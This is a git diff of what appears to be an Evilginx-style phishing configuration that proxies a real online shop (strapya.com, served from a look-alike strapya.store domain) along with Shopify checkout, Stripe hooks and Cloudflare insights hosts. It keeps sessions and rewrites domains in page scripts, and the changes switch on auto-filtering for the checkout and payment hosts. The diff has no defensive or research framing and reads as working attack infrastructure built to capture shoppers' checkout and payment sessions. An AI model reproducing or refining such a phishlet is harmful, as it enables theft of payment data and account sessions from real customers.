@@ -10,11 +10,12 @@ proxy_hosts:
   # shopify 平台相关
   #- {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false}
 #  - {phish_sub: 'sp', orig_sub: '', domain: 'shop.app', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false }
-  - {phish_sub: 'checkoutpci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: false }
+  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'checkoutpci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cloudflareinsights.com', session: true, is_landing: false, auto_filter: true }
 #  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false }
 #  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: false }
-  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: false }
+  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: true }
   # track、日志相关
 #  - {phish_sub: 'api', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
 #  - {phish_sub: 'cdnin', orig_sub: 'cdn', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
@@ -35,9 +36,9 @@ sub_filters:
     search: 'strapya\.com'
     replace: 'strapya.store'
     mimes: [ 'text/javascript', 'application/javascript' ]
-  - triggers_on: 'hooks.strapya.com'
+  - triggers_on: 'hooks.stripe.com'
     orig_sub: 'hooks'
-    domain: 'strapya.com'
+    domain: 'stripe.com'
     search: 'strapya\.com'
     replace: 'strapya.store'
     mimes: [ 'text/html','text/javascript', 'application/javascript' ]
